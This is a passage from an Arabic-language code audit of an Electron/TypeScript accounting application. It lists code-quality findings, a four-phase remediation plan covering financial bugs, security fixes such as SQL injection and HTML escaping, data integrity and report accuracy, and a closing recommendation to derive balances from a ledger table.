|---|---|---|---|
| ج-1 | **لا توجد أي اختبارات** — صفر ملفات test في مشروع محاسبي | — | عالي |
| ج-2 | لا يوجد إعداد ESLint رغم وجود سكربت `lint` | `package.json:12` | عالي |
| ج-3 | استخدام مفرط لـ `as any` (~200 موضع) يُلغي فائدة TypeScript | كل الملفات | متوسط |
| ج-4 | `catch {}` صامتة تبتلع الأخطاء | `connection.ts:20,47`, `license.handlers.ts:64` | متوسط |
| ج-5 | مسافات بادئة غير متسقة في `registerSettlementHandlers()` وما بعدها | `index.ts:108-114` | منخفض |
| ج-6 | `knex` مُدرَجة كاعتماد لكنها غير مستخدمة إطلاقاً | `package.json` | منخفض |
| ج-7 | `auth.store` لا يحفظ الجلسة — لا يوجد "تذكّرني" فعلي | `auth.store.ts:40` | متوسط |
| ج-8 | `Login.tsx` يعرض «نسيت كلمة المرور» يطلب بيانات المطور من المستخدم النهائي | `Login.tsx:264` | متوسط |
| ج-9 | تحذير CSP ظاهر في سجل التشغيل (`unsafe-eval` في وضع التطوير) | `electron_err.txt` | منخفض |

---

# خطة الإصلاح المقترحة (حسب الأولوية)

### المرحلة 1 — إيقاف النزيف المالي (فوري)
1. `sales.handlers.ts:170` — تحويل `if` الثانية إلى `else if` (نقدية مزدوجة)
2. `reports.handlers.ts:236` — استبعاد `Source='maintenance'` من `salesGross` (ازدواج الإيراد)
3. `sales.handlers.ts:243` / `purchases.handlers.ts:240` — ربط خصم رصيد الطرف بالمبلغ غير المدفوع فقط
4. `statement.handlers.ts:163` — `PaymentSourceType` ← `PaymentSource`
5. `reports.handlers.ts:555` — تصحيح الـ JOIN عبر جدول `sales`

### المرحلة 2 — الأمان (خلال أسبوع)
6. نقل التحقق من كلمة مرور المطور للعملية الرئيسية + bcrypt
7. إضافة طبقة تحقق صلاحيات على كل معالجات IPC
8. حفظ جلسة المستخدم في العملية الرئيسية وإزالة `userId: 1`
9. تهريب HTML في `print.handlers.ts` + `sandbox: true`
10. معاملات مرتبطة في `statement.handlers.ts` و `reports.handlers.ts` (حقن SQL)
11. قائمة بيضاء لأسماء الجداول في `db:exportCSV`

### المرحلة 3 — سلامة البيانات
12. توليد أرقام المستندات عبر جدول تسلسلات
13. إضافة `WarehouseID` لكل عمليات المخزون
14. `db.backup()` بدل `copyFileSync` (سلامة WAL)
15. لفّ العمليات متعددة الخطوات في `transaction`

### المرحلة 4 — دقة التقارير
16. إيراد الخدمات = العمولة فقط (مبدأ الوكيل)
17. توحيد أساس مصروف الرواتب (الاستحقاق لا الدفع)
18. إزالة ازدواج مصروف الإيجار
19. تصحيح `cogsReturns` عبر `sale_return_details`
20. إضافة فحص توازن `الأصول = الخصوم + حقوق الملكية`

---

## ملاحظة ختامية

الجوانب الإيجابية: `contextIsolation: true` و `nodeIntegration: false` مضبوطان بشكل صحيح، وكلمات مرور المستخدمين تُخزَّن بـ bcrypt، ومعظم الاستعلامات تستخدم معاملات مرتبطة، ووجود `foreign_keys = ON` و `WAL`، وبنية الوحدات واضحة ومنظّمة.

المشكلة الجوهرية أنّ النظام يعتمد على **أرصدة مخزَّنة** (`Balance` في كل جدول) تُحدَّث يدوياً في كل عملية، بدلاً من اشتقاقها من دفتر قيود. هذا يجعل كل خطأ في أي معالج يُفسد الأرصدة بشكل دائم وغير قابل للاكتشاف. على المدى الطويل، أنصح بإضافة جدول حركات (`ledger_entries`) يُسجَّل فيه كل أثر مالي، مع اشتقاق الأرصدة منه — يبقى إدخال البيانات بسيطاً للمستخدم كما هو مطلوب، لكن يصبح النظام قابلاً للتدقيق والتصحيح الذاتي.
